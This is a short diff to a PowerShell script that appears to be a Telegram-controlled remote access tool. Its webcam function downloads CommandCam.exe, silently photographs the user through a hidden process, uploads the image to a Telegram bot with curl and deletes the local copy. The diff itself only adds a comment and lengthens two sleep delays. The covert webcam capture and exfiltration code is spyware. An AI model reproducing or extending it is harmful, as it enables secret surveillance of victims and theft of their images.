@@ -130,6 +130,7 @@ function download($FileToDownload) {
 function webcam {
     #(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
     Write-Host "Downloading CommandCam.."
+    # https://batchloaf.wordpress.com/commandcam/
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -138,7 +139,7 @@ function webcam {
     Write-Host "Taking picture.."
     $args = "/filename C:\Users\$env:username\Documents\image.jpg"
     Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 5
 
     Write-Host "Sending picture.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
@@ -148,7 +149,7 @@ function webcam {
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Write-Host "Deleting picture.."
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 5
     Remove-Item $photo
 }
 
@@ -336,3 +337,4 @@ While ($DoNotExit)  {
 	
   }
 }
+
